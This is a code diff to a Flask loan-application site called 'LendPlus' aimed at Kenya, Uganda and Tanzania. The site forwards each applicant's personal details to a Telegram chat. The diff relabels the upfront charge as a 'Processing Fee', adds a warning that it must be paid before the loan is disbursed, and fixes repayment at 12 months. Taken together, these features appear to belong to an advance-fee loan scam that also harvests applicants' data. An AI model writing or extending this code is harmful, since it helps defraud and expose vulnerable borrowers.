@@ -49,6 +49,7 @@ if TELEGRAM_ENABLED:
 else:
     logger.warning("⚠️ Telegram is DISABLED - check environment variables TELEGRAM_TOKEN and TELEGRAM_CHAT_ID")
 
+# Country Configuration - Updated Mobile Money
 COUNTRIES = {
     'kenya': {
         'name': 'Kenya',
@@ -68,7 +69,7 @@ COUNTRIES = {
         'flag': '🇺🇬',
         'min_loan': 50000,
         'max_loan': 2000000,
-        'mobile_money': 'M-Pesa'
+        'mobile_money': 'MTN Mobile Money'
     },
     'tanzania': {
         'name': 'Tanzania',
@@ -78,16 +79,17 @@ COUNTRIES = {
         'flag': '🇹🇿',
         'min_loan': 10000,
         'max_loan': 500000,
-        'mobile_money': 'M-Pesa'
+        'mobile_money': 'Airtel Money'
     }
 }
 
 APP_NAME = "LendPlus"
 COMPANY_NAME = "Aventus Technology Limited"
-# UPDATED: WhatsApp only number
 SUPPORT_PHONE = "+254739239646"
 SUPPORT_WHATSAPP = "https://wa.me/254739239646"
 SUPPORT_EMAIL = "customer@lendplus.ke"
+# Updated: 12 months repayment period
+REPAYMENT_MONTHS = 12
 # ==================== END CONFIG ====================
 
 def send_telegram_message(message):
@@ -128,10 +130,10 @@ def format_application_message(data):
     fee_rate = data.get('fee_rate', 5)
     fee_amount = amount * (fee_rate / 100)
     total = amount + fee_amount
-    months = data.get('months', 1)
     country = data.get('country', 'Kenya')
     currency = data.get('currency', 'KES')
     phone_prefix = data.get('phone_prefix', '+254')
+    mobile_money = data.get('mobile_money', 'M-Pesa')
     
     return f"""
 📋 <b>NEW LOAN APPLICATION</b>
@@ -140,7 +142,7 @@ def format_application_message(data):
 🌍 <b>Application Details</b>
 • Country: {data.get('flag', '')} {country}
 • Currency: {currency}
-• Mobile Money: {data.get('mobile_money', 'M-Pesa')}
+• Mobile Money: {mobile_money}
 
 👤 <b>Personal Information</b>
 • Full Name: {data.get('first_name', 'N/A')} {data.get('last_name', 'N/A')}
@@ -151,9 +153,11 @@ def format_application_message(data):
 
 💰 <b>Loan Details</b>
 • Amount: {currency} {amount:,.2f}
-• Application Fee: {fee_rate}% ({currency} {fee_amount:,.2f})
+• Processing Fee: {fee_rate}% ({currency} {fee_amount:,.2f})
 • Total Payable: {currency} {total:,.2f}
-• Term: {months} month(s)
+• Repayment Period: 12 months
+
+⚠️ <b>Important:</b> Processing fee must be paid before loan disbursement.
 
 🕐 <b>Application Time</b>
 • Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
@@ -166,28 +170,28 @@ def format_application_message(data):
 """
 
 def calculate_loan_details(amount, country):
-    """Calculate loan fee and repayment"""
+    """Calculate loan fee - Updated for 12 months"""
     if country == 'kenya':
         if amount <= 10000:
-            fee_rate, months = 5, 1
+            fee_rate = 5
         elif amount <= 30000:
-            fee_rate, months = 8, 3
+            fee_rate = 8
         else:
-            fee_rate, months = 12, 6
+            fee_rate = 12
     elif country == 'uganda':
         if amount <= 500000:
-            fee_rate, months = 5, 1
+            fee_rate = 5
         elif amount <= 1000000:
-            fee_rate, months = 8, 3
+            fee_rate = 8
         else:
-            fee_rate, months = 12, 6
+            fee_rate = 12
     else:  # tanzania
         if amount <= 100000:
-            fee_rate, months = 5, 1
+            fee_rate = 5
         elif amount <= 300000:
-            fee_rate, months = 8, 3
+            fee_rate = 8
         else:
-            fee_rate, months = 12, 6
+            fee_rate = 12
     
     fee_amount = amount * (fee_rate / 100)
     total = amount + fee_amount
@@ -196,7 +200,7 @@ def calculate_loan_details(amount, country):
         'fee_rate': fee_rate,
         'fee_amount': fee_amount,
         'total': total,
-        'months': months
+        'months': 12  # Always 12 months
     }
 
 def generate_application_id():
@@ -369,7 +373,8 @@ def loan_amount():
                          min_loan=min_loan,
                          max_loan=max_loan,
                          currency=currency,
-                         currency_symbol=currency_symbol)
+                         currency_symbol=currency_symbol,
+                         repayment_months=REPAYMENT_MONTHS)
 
 @app.route('/confirmation')
 def confirmation():
@@ -390,7 +395,7 @@ def confirmation():
                          fee_rate=data.get('fee_rate', 5),
                          fee_amount=data.get('fee_amount', 0),
                          total=data.get('total', 0),
-                         months=data.get('months', 0),
+                         months=data.get('months', 12),
                          application_id=data.get('application_id', ''),
                          support_phone=SUPPORT_PHONE,
                          support_whatsapp=SUPPORT_WHATSAPP,
